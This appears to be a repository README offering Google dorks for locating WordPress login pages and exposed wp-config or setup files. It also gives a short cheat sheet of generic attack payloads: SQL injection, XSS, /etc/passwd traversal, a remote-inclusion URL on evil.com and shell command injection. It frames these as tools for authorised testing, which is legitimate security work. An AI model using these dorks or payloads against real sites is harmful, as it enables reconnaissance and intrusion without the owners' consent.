# WordPress Dorks Repository

![WordPress](https://img.shields.io/badge/WordPress-CMS-blue)

Welcome to the WordPress Dorks repository! This collection comprises specific WordPress dorks, payloads, vulnerabilities, and insights into potential security vulnerabilities or loopholes in websites powered by the WordPress Content Management System (CMS).

## Table of Contents
- [What is WordPress?](#what-is-wordpress)
- [Examples of WordPress Dorks](#examples-of-wordpress-dorks)
- [WordPress Vulnerabilities](#wordpress-vulnerabilities)
- [WordPress Payloads](#wordpress-payloads)
- [Understanding WordPress Dorks](#understanding-wordpress-dorks)
- [Exploring the GDorks Main Repository](#exploring-the-gdorks-main-repository)
- [How to Use This Repository](#how-to-use-this-repository)
- [Contributing](#contributing)


## What is WordPress?

WordPress is a widely used and popular open-source Content Management System (CMS) that empowers individuals and businesses to create websites and blogs. However, due to its widespread usage, WordPress can be prone to various security vulnerabilities, especially if not maintained or configured properly.

## Examples of WordPress Dorks

These WordPress-specific dorks aim to identify potential security weaknesses or loopholes in WordPress-powered websites:

1. **WordPress Version Check Dork:** Identifies the WordPress version in use.

   ```
   inurl:/readme.html
   ```

2. **WordPress Login Page Dork:** Locates WordPress login pages.

   ```
   inurl:/wp-login.php
   ```

3. **WordPress Configuration File Dork:** Searches for WordPress configuration files.

   ```
   inurl:wp-config.php
   ```

4. **WordPress Database Information Dork:** Retrieves WordPress database information.

   ```
   inurl:/wp-admin/setup-config.php
   ```

5. **WordPress Plugins Dork:** Identifies plugins and their vulnerabilities.

   ```
   inurl:/wp-content/plugins/
   ```

For additional WordPress-specific dorks and in-depth explanations, explore the contents within the [GDorks repository](https://github.com/Ishanoshada/GDorks/).

## WordPress Vulnerabilities

- **SQL Injection:** WordPress is vulnerable to SQL injection attacks, especially in poorly coded plugins or themes.
- **Cross-Site Scripting (XSS):** XSS vulnerabilities may exist in various parts of WordPress sites, leading to client-side attacks.
- **File Inclusion:** Improper file handling could lead to file inclusion vulnerabilities.
- **Directory Traversal:** WordPress sites may be vulnerable to directory traversal attacks.

## WordPress Payloads for Security Testing

Here are some common WordPress payloads that can be used for security testing, auditing, or demonstrating potential vulnerabilities:

1. **SQL Injection Payloads:**

   - `' OR 1=1--`
   - `1' OR '1' = '1'--`

2. **XSS Payloads:**

   - `<script>alert('XSS')</script>`
   - `<img src="javascript:alert('XSS')" />`

3. **Path Traversal Payloads:**

   - `../../../etc/passwd`
   - `../../../../../../etc/passwd%00`

4. **Remote File Inclusion Payloads:**

   - `http://evil.com/malicious.php`
   - `data://text/plain;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`

5. **Command Injection Payloads:**

   - `; ls -la`
   - `| ls`

6. **LDAP Injection Payloads:**

   - `*)(|(objectClass=*))`

7. **Brute Force Payloads:**

   - `' OR '1'='1`

8. **Header Injection Payloads:**

   - `Location: https://malicious-site.com`

Please ensure you have proper authorization and permission before utilizing these payloads for security testing. Remember to act responsibly and ethically when testing WordPress websites for vulnerabilities.

## Understanding WordPress Dorks

Understanding WordPress dorks is crucial to assess the security posture of WordPress websites. Recognizing these dorks enables proactive measures to secure WordPress installations and prevent potential exploitation.

## Exploring the GDorks Main Repository

The [GDorks repository](https://github.com/Ishanoshada/GDorks/) is an extensive resource containing a diverse collection of WordPress dorks, categorized folders, and comprehensive documentation covering various vulnerabilities and security insights related to WordPress CMS.

## How to Use This Repository

This repository is organized into folders, each containing specific WordPress dorks, payloads, and related information. Users can explore these folders to discover WordPress dorks and payloads of interest.

To contribute to this repository, follow the steps outlined in the [Contributing](#contributing) section.

## Contributing

Contributions to this repository are encouraged! If you have additional WordPress dorks, examples, or documentation to share, follow these steps:

1. Fork the repository.
2. Create a new branch with a descriptive name.
3. Add your WordPress dorks or other content.
4. Submit a pull request.

Your contributions will help make this repository more comprehensive and informative for the WordPress community.


Explore, learn, and contribute responsibly to secure WordPress installations.

Happy hunting for WordPress vulnerabilities, and remember to act responsibly and ethically when testing security vulnerabilities.
